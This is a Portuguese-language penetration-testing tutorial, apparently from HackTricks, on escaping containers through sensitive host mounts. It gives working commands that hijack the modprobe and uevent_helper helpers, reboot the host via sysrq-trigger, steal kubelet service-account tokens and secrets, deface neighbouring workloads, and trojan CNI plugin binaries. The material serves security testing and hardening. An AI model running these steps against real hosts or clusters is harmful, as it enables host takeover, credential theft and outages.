# Montagens sensíveis do host

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

As montagens do host são uma das superfícies práticas mais importantes de container-escape, pois frequentemente desfazem uma visualização de processos cuidadosamente isolada, restaurando a visibilidade direta dos recursos do host. Os casos perigosos não se limitam a `/`. Bind mounts de `/proc`, `/sys`, `/var`, sockets de runtime, estado gerenciado pelo kubelet ou paths relacionados a dispositivos podem expor controles do kernel, credenciais, filesystems de containers vizinhos e interfaces de gerenciamento do runtime.

Esta página existe separadamente das páginas individuais de proteção porque o modelo de abuso é transversal. Uma montagem do host com permissão de escrita é perigosa em parte por causa dos mount namespaces, em parte por causa dos user namespaces, em parte por causa da cobertura do AppArmor ou SELinux e em parte por causa do path exato do host que foi exposto. Tratar esse assunto separadamente facilita muito a análise da attack surface.

## Exposição de `/proc`

O procfs contém tanto informações comuns sobre processos quanto interfaces de controle do kernel de alto impacto. Portanto, um bind mount como `-v /proc:/host/proc` ou uma visualização do container que exponha entradas graváveis inesperadas do proc pode levar a divulgação de informações, denial of service ou execução direta de código no host.

Os paths de alto valor do procfs incluem:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Comece verificando quais entradas de alto valor do procfs estão visíveis ou podem ser modificadas:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Esses paths são interessantes por diferentes motivos. `core_pattern`, `modprobe` e `binfmt_misc` podem se tornar paths de execução de código no host quando estão com permissão de escrita. `kallsyms`, `kmsg`, `kcore` e `config.gz` são fontes poderosas de reconhecimento para exploração do kernel. `sched_debug` e `mountinfo` revelam o contexto de processos, cgroups e filesystem, o que pode ajudar a reconstruir o layout do host de dentro do container.

O valor prático de cada path é diferente, e tratar todos como se tivessem o mesmo impacto dificulta a triagem:

- `/proc/sys/kernel/core_pattern`
Se estiver com permissão de escrita, este é um dos paths procfs de maior impacto, pois o kernel executará um pipe handler após um crash. Um container que consiga apontar `core_pattern` para um payload armazenado em seu overlay ou em um host path montado frequentemente pode obter execução de código no host. Consulte também [read-only-paths.md](protections/read-only-paths.md) para um exemplo dedicado.
- `/proc/sys/kernel/modprobe`
Este path controla o userspace helper usado pelo kernel quando precisa invocar a lógica de carregamento de módulos. Se estiver com permissão de escrita a partir do container e for interpretado no contexto do host, pode se tornar outra primitive de execução de código no host. É especialmente interessante quando combinado com uma forma de acionar o helper path.
- `/proc/sys/vm/panic_on_oom`
Normalmente, este não é uma primitive de escape limpa, mas pode transformar pressão de memória em denial of service em todo o host, convertendo condições de OOM em comportamento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se a interface de registro estiver com permissão de escrita, o atacante pode registrar um handler para um magic value escolhido e obter execução no contexto do host quando um arquivo correspondente for executado.
- `/proc/config.gz`
Útil para a triagem de kernel exploits. Ajuda a determinar quais subsistemas, mitigações e recursos opcionais do kernel estão habilitados sem precisar dos metadados de pacotes do host.
- `/proc/sysrq-trigger`
Principalmente um path de denial of service, mas muito sério. Pode reiniciar, causar panic ou interromper o host imediatamente de outras formas.
- `/proc/kmsg`
Revela mensagens do kernel ring buffer. É útil para fingerprinting do host, análise de crashes e, em alguns ambientes, para fazer leak de informações úteis para a exploração do kernel.
- `/proc/kallsyms`
É valioso quando pode ser lido, pois expõe informações sobre símbolos exportados do kernel e pode ajudar a contornar suposições de address randomization durante o desenvolvimento de kernel exploits.
- `/proc/[pid]/mem`
Esta é uma interface direta para a memória de processos. Se o processo-alvo puder ser alcançado com as condições necessárias semelhantes às de ptrace, pode ser possível ler ou modificar a memória de outro processo. O impacto real depende bastante de credenciais, `hidepid`, Yama e restrições de ptrace; portanto, este é um path poderoso, mas condicional.
- `/proc/kcore`
Expõe uma visão da memória do sistema no estilo de uma core image. O arquivo é enorme e difícil de usar, mas, se puder ser lido de forma significativa, indica uma superfície de memória do host gravemente exposta.
- `/proc/kmem` e `/proc/mem`
Interfaces de memória bruta historicamente de alto impacto. Em muitos sistemas modernos, estão desabilitadas ou fortemente restritas, mas, se estiverem presentes e utilizáveis, devem ser tratadas como findings críticos.
- `/proc/sched_debug`
Faz leak de informações de scheduling e de tasks que podem expor as identidades de processos do host, mesmo quando outras visões de processos parecem mais limpas do que o esperado.
- `/proc/[pid]/mountinfo`
É extremamente útil para reconstruir onde o container realmente está localizado no host, quais paths são baseados em overlay e se um mount com permissão de escrita corresponde a conteúdo do host ou apenas à camada do container.

Se `/proc/[pid]/mountinfo` ou os detalhes do overlay puderem ser lidos, use-os para recuperar o host path do filesystem do container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Esses comandos são úteis porque vários truques de execução no host exigem transformar um caminho dentro do container no caminho correspondente sob a perspectiva do host.

### Exemplo completo: abuso do caminho do helper `modprobe`

Se `/proc/sys/kernel/modprobe` puder ser escrito a partir do container e o caminho do helper for interpretado no contexto do host, ele poderá ser redirecionado para um payload controlado pelo atacante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
O gatilho exato depende do alvo e do comportamento do kernel, mas o ponto importante é que um caminho auxiliar com permissão de escrita pode redirecionar uma futura invocação de um helper do kernel para conteúdo controlado pelo atacante no host.

### Exemplo Completo: Kernel Recon Com `kallsyms`, `kmsg` E `config.gz`

Se o objetivo for avaliar a exploitability em vez de realizar um escape imediato:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Esses comandos ajudam a determinar se informações úteis de símbolos estão visíveis, se as mensagens recentes do kernel revelam um estado interessante e quais recursos ou mitigações do kernel estão compilados. O impacto geralmente não é uma escape direta, mas isso pode reduzir significativamente o tempo de triagem de vulnerabilidades do kernel.

### Exemplo completo: reinicialização do host via SysRq

Se `/proc/sysrq-trigger` for gravável e alcançar a visão do host:
```bash
echo b > /proc/sysrq-trigger
```
O efeito é a reinicialização imediata do host. Este não é um exemplo sutil, mas demonstra claramente que a exposição do procfs pode ser muito mais grave do que a divulgação de informações.

## Exposição de `/sys`

O sysfs expõe grandes quantidades do estado do kernel e dos dispositivos. Alguns caminhos do sysfs são principalmente úteis para fingerprinting, enquanto outros podem afetar a execução de helpers, o comportamento dos dispositivos, a configuração de módulos de segurança ou o estado do firmware.

Os caminhos de alto valor do sysfs incluem:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Esses caminhos são importantes por diferentes motivos. `/sys/class/thermal` pode influenciar o comportamento do gerenciamento térmico e, portanto, a estabilidade do host em ambientes com exposição inadequada. `/sys/kernel/vmcoreinfo` pode leak informações sobre dumps de crash e o layout do kernel, o que ajuda no fingerprinting de baixo nível do host. `/sys/kernel/security` é a interface `securityfs` usada pelos Linux Security Modules, portanto, o acesso inesperado a ela pode expor ou alterar o estado relacionado a MAC. Os caminhos de variáveis EFI podem afetar configurações de boot mantidas pelo firmware, tornando-os muito mais sérios do que arquivos de configuração comuns. O `debugfs` em `/sys/kernel/debug` é especialmente perigoso porque é intencionalmente uma interface voltada para desenvolvedores, com muito menos expectativas de segurança do que APIs do kernel reforçadas e voltadas para produção.

Comandos úteis para revisar esses caminhos são:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
O que torna esses comandos interessantes:

- `/sys/kernel/security` pode revelar se AppArmor, SELinux ou outra superfície LSM está visível de uma forma que deveria ter permanecido exclusiva do host.
- `/sys/kernel/debug` costuma ser a descoberta mais alarmante deste grupo. Se o `debugfs` estiver montado e puder ser lido ou gravado, espere uma ampla superfície voltada ao kernel, cujo risco exato depende dos nós de debug habilitados.
- A exposição de variáveis EFI é menos comum, mas tem alto impacto quando presente, pois toca configurações respaldadas pelo firmware, em vez de arquivos comuns de runtime.
- `/sys/class/thermal` é principalmente relevante para a estabilidade do host e a interação com o hardware, não para um escape organizado no estilo shell.
- `/sys/kernel/vmcoreinfo` é principalmente uma fonte de fingerprinting do host e análise de crashes, útil para entender o estado do kernel em baixo nível.

### Exemplo completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` puder ser gravado, o kernel poderá executar um helper controlado pelo atacante quando um `uevent` for acionado:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
O motivo pelo qual isso funciona é que o caminho do helper é interpretado do ponto de vista do host. Quando acionado, o helper é executado no contexto do host, e não dentro do container atual.

## Exposição de `/var`

Montar o `/var` do host em um container costuma ser subestimado porque isso não parece tão dramático quanto montar o `/`. Na prática, pode ser suficiente para alcançar runtime sockets, diretórios de snapshots de containers, volumes de pods gerenciados pelo kubelet, service-account tokens projetados e filesystems de aplicações vizinhas. Em nodes modernos, `/var` geralmente é onde realmente fica o estado de containers mais relevante do ponto de vista operacional.

### Exemplo de Kubernetes

Um pod com `hostPath: /var` frequentemente consegue ler tokens projetados de outros pods e conteúdo de snapshots overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Esses comandos são úteis porque respondem se o mount expõe apenas dados de aplicação sem interesse ou credenciais de cluster de alto impacto. Um token de service account legível pode transformar imediatamente a execução de código local em acesso à Kubernetes API.

Se o token estiver presente, valide o que ele consegue acessar em vez de parar na descoberta do token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
O impacto aqui pode ser muito maior do que o acesso ao node local. Um token com RBAC amplo pode transformar um `/var` montado em um comprometimento de todo o cluster.

### Exemplo de Docker e containerd

Em hosts Docker, os dados relevantes geralmente ficam em `/var/lib/docker`, enquanto em nodes Kubernetes baseados em containerd eles podem estar em `/var/lib/containerd` ou em paths específicos do snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se o `/var` montado expuser o conteúdo gravável de um snapshot de outro workload, o atacante poderá alterar arquivos da aplicação, inserir conteúdo web ou modificar scripts de inicialização sem tocar na configuração atual do container.

Ideias concretas de abuso após encontrar conteúdo gravável de um snapshot:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Esses comandos são úteis porque mostram as três principais categorias de impacto de um `/var` montado: adulteração de aplicações, recuperação de secrets e movimentação lateral para workloads vizinhos.

## Estado do Kubelet, Plugins e Caminhos do CNI

Uma montagem de `/var/lib/kubelet`, `/opt/cni/bin` ou `/etc/cni/net.d` costuma ser exposta por DaemonSets privilegiados, agentes CNI, plugins de nó CSI, operadores de GPU e auxiliares de armazenamento. Essas montagens são fáceis de descartar como "infraestrutura do nó", mas ficam diretamente no caminho de execução de novos pods e frequentemente contêm credenciais do kubelet, secrets projetados, sockets de registro e binários executáveis de plugins no host.

Os alvos de alto valor incluem:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Comandos úteis para análise são:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Por que esses caminhos são importantes:

- `/var/lib/kubelet/pki` pode expor certificados de cliente do kubelet e outras credenciais locais do node que, dependendo do design do cluster, às vezes podem ser reutilizadas contra o API server ou endpoints TLS voltados ao kubelet.
- `/var/lib/kubelet/pods` geralmente contém tokens de service account projetados e Secrets montados para pods vizinhos no mesmo node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` é principalmente uma superfície de reconnaissance, mas muito útil: revela quais pods e containers atualmente possuem GPUs, hugepages, dispositivos SR-IOV e outros recursos escassos locais do node.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` revelam quais plugins CSI, DRA e de dispositivos estão instalados e com quais sockets o kubelet deve se comunicar. Se esses diretórios forem graváveis, em vez de apenas legíveis, o finding se torna muito mais sério.
- `/opt/cni/bin` e `/etc/cni/net.d` ficam diretamente no caminho de configuração da rede dos pods. O acesso de escrita nesses locais costuma ser uma primitiva de execução no host retardada, e não apenas uma exposição de configuração.

### Exemplo completo: `/opt/cni/bin` gravável

Se um diretório de binários CNI do host estiver montado com acesso de leitura e escrita, substituir um plugin pode ser suficiente para obter execução no host na próxima vez que o kubelet criar um pod sandbox nesse node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Isso não é tão imediato quanto um `docker.sock` montado, mas costuma ser mais realista em pods de infraestrutura Kubernetes comprometidos. O ponto importante é que o binário modificado é executado posteriormente pelo fluxo de configuração de rede do host, e não pelo container atual.


## Sockets de Runtime

As montagens sensíveis do host geralmente incluem sockets de runtime em vez de diretórios completos. Eles são tão importantes que merecem ser repetidos explicitamente aqui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consulte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para obter os fluxos completos de exploração depois que um desses sockets for montado.

Como um padrão rápido para a primeira interação:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se um desses ataques for bem-sucedido, o caminho de "mounted socket" até "start a more privileged sibling container" geralmente é muito mais curto do que qualquer caminho de kernel breakout.

## Writable Host Path Task Hijack

Um host mount com permissão de escrita não precisa expor `/` para ser perigoso. Se o caminho montado contiver scripts, arquivos de configuração, hooks, plugins ou arquivos consumidos posteriormente por uma tarefa agendada ou serviço executado no host, o container poderá conseguir alterar o que o host executa.

Fluxo genérico de revisão:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Se um arquivo gravável for consumido por um processo do host, mantenha o payload simples e observável durante os testes:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
A parte interessante é a trust boundary: a gravação acontece de dentro do container, mas a execução ocorre posteriormente no contexto do serviço do host. Isso transforma um hostPath ou bind mount restrito em uma primitiva de execução de código no host atrasada.

## CVEs relacionadas a mounts

Host mounts também interagem com vulnerabilidades do runtime. Exemplos recentes importantes incluem:

- `CVE-2024-21626` no `runc`, em que um file descriptor de diretório vazado poderia posicionar o diretório de trabalho no filesystem do host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` no BuildKit, em que Dockerfiles, frontends e fluxos `RUN --mount` maliciosos poderiam reintroduzir acesso a arquivos do host, exclusão ou privilégios elevados durante os builds.
- `CVE-2024-1753` nos fluxos de build do Buildah e Podman, em que bind mounts elaborados durante o build poderiam expor `/` com permissões de leitura e escrita.
- `CVE-2025-47290` no `containerd` 2.1.0, em que uma condição TOCTOU durante o image unpack poderia permitir que uma imagem especialmente criada modificasse o filesystem do host durante o pull.

Essas CVEs são importantes aqui porque mostram que o tratamento de mounts não depende apenas da configuração do operador. O próprio runtime também pode introduzir condições de escape orientadas por mounts.

## Verificações

Use estes comandos para localizar rapidamente as exposições de mounts de maior impacto:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
O que é interessante aqui:

- A raiz do Host, `/proc`, `/sys`, `/var` e os runtime sockets são todos achados de alta prioridade.
- Entradas graváveis de proc/sys geralmente significam que o mount está expondo controles globais do kernel do Host, em vez de uma visão segura do container.
- Caminhos de `/var` montados exigem uma revisão de credenciais e de workloads vizinhos, não apenas uma revisão do filesystem.
- Diretórios de estado do Kubelet e caminhos de CNI/plugin merecem a mesma prioridade que os runtime sockets, pois geralmente ficam diretamente no caminho de criação de pods e distribuição de credenciais do node.

## Referências

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
